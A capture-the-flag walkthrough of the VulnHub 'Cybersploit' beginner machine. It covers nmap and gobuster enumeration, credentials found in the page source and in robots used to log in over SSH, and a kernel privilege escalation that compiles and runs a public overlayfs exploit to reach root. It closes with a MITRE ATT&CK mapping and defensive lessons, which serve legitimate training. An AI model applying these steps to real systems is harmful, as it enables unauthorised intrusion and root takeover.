
## Cybersploit


| **Platform**   | VulnHub                 |
| -------------- | ----------------------- |
| **Machine**    | Cybersploit:1, modified |
| **Creator**    | Cybersploit             |
| **OS**         | Linux                   |
| **Difficulty** | Beginner                |


Use netdiscover to find the VM, then run `Nmap`. 


 ~~~
 nmap -sC -sV -p- 10.0.2.19
 ~~~  


| Port | Service | Details                                                       |
| ---- | ------- | ------------------------------------------------------------- |
| 22   | ssh     | OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0) |
| 80   | http    | Apache httpd 2.2.22 ((Ubuntu))                                |


Go to the site on port 80. Clicking on the different pages gives no results, but looking into the page source yields    
   
`<!-------------username:CSA--------------------->`   


#### **Directory Enumeration**



Use `gobuster` in directory mode, which yields several directories:

~~~sh
gobuster dir -u http://10.0.2.19 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt   
   
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://10.0.2.19
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s

Starting gobuster in directory enumeration mode

index                (Status: 200) [Size: 2295]
robots               (Status: 200) [Size: 93]
hacker               (Status: 200) [Size: 3757743]
Progress: 87662 / 87662 (100.00%)

Finished
~~~


In `robots` we see a peculiar string (the string is different in the non-modified machine):   
  `TmljZSB0cnksIGJ1dCB5b3UgbmVlZCBtb3JlLgpGbGFnMTogaHR0cHM6Ly90Lm1lL1NvZnRTZXJ2ZUVkdWNhdGlvbg==`   


Check its properties:     
~~~sh
  echo -n "TmljZSB0cnksIGJ1dCB5b3UgbmVlZCBtb3JlLgpGbGFnMTogaHR0cHM6Ly90Lm1lL1NvZnRTZXJ2ZUVkdWNhdGlvbg=="|wc -m                   
  92   
~~~

Both the length that is divisible by 4 and padding '=' point to it being a valid base64 encoded string. Decode it to get the first flag.
~~~~sh
  echo "TmljZSB0cnksIGJ1dCB5b3UgbmVlZCBtb3JlLgpGbGFnMTogaHR0cHM6Ly90Lm1lL1NvZnRTZXJ2ZUVkdWNhdGlvbg=="| base64 -d    
  Nice try, but you need more.   
  Flag1: https://*hidden*   
~~~~

#### **Initial Access**


Lets try to ssh w/ the username CSA and the first flag as password, which works.
By poking around we don't see any obvious flags.
Looking into .bash_history of user CSA shows a second flag was hidden into `tmp.txt` and then into `.info`   

~~~
touch .info
echo "Hello again! Flag2: https://*hidden*" > tmp.txt
xxd tmp.txt
cat tmp.txt
xxd -r -p tmp.txt > .info
~~~
(i wanted to double check with the binary from the `.info` file so i put it into a binary converter to get exactly the same flag)


#### **Privilege Escalation**


~~~
CSA@cybersploit-CTF:~$ uname -a
Linux cybersploit-CTF 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
~~~


By looking up the kernel version, we find a [known vulnerability,](https://nvd.nist.gov/vuln/detail/cve-2015-1328]) and an [exploit](https://www.exploit-db.com/exploits/37292) we can use.


Make a `tmp` dir and copy it into there, then compile.    
~~~
CSA@cybersploit-CTF:~/tmp$ gcc 37292.c
CSA@cybersploit-CTF:~/tmp$ ls -la
total 28
drwxrwxr-x  2 CSA CSA  4096 Sep 18 09:50 .
drwxr-xr-x 22 CSA CSA  4096 Sep 18 09:47 ..
-rw-r--r--  1 CSA CSA  5119 Sep 18 09:47 37292.c
-rwxrwxr-x  1 CSA CSA 12016 Sep 18 09:50 a.out
~~~


Now we have a binary that we can execute.

~~~
CSA@cybersploit-CTF:~/tmp$ ./a.out
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
whoami
root
cd /
cd root
ls -la
total 40
drwx------  5 root root 4096 Jun 27  2020 .
drwxr-xr-x 23 root root 4096 Apr 29  2025 ..
-rw-------  1 root root  710 Apr 26  2025 .bash_history
-rw-r--r--  1 root root 3106 Apr 19  2012 .bashrc
drwx------  3 root root 4096 Jun 27  2020 .cache
drwx------  3 root root 4096 Jun 27  2020 .dbus
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
drwx------  2 root root 4096 Sep 18 09:35 .pulse
-rw-------  1 root root  256 Jun 25  2020 .pulse-cookie
-rw-r--r--  1 root root 1088 Apr 30  2025 finalflag.txt
cat finalflag.txt
~~~


We have the root flag.


#### **MITRE ATT&CK Mapping**

| **Step**                            | **Actions**           | **Technique**                                         |
| ----------------------------------- | --------------------- | ----------------------------------------------------- |
| Scan with Nmap                      | Service discovery     | T1595 Active scanning                                 |
| Directory enumeration with Gobuster | Directory enumeration | T1595.003 Active Scanning: Wordlist Scanning          |
| Access `robots`                     | Access hidden file    | T1552.001 Unsecured Credentials: Credentials In Files |
| SSH with found credentials          | Initial Access        | T1078 Valid Account                                   |
| Access .bash_history                | Access hidden file    | T1552.003 Unsecured Credentials: Shell History        |
| Use kernel exploit                  | Privilege escalation  | T1068 Exploitation for Privilege Escalation           |
| Access root flag                    | Read local file       | T1005 Data from Local System                          |


#### **Vulnerability Table**

| **Vulnerability**                                           | **Impact**                   |
| ----------------------------------------------------------- | ---------------------------- |
| Unsecured hardcoded username in page source                 | System access via SSH        |
| Unsecured password in `robots`                              | Access to first flag         |
| Credentials as command-line argument stored in bash history | Access to second flag        |
| Outdated Linux kernel                                       | Privilege escalation to root |


#### **Lessons Learned**

- Do not store credentials in HTML
- Do not store credentials in `robots`
- Do not use credentials as command-lline arguments
- Implement regular OS and kernel updates


#### **Modified Image Used**

[Google Drive Link](https://drive.google.com/drive/folders/1bxINfhxSll6MKwqg28uDYVZY50YsaTab)
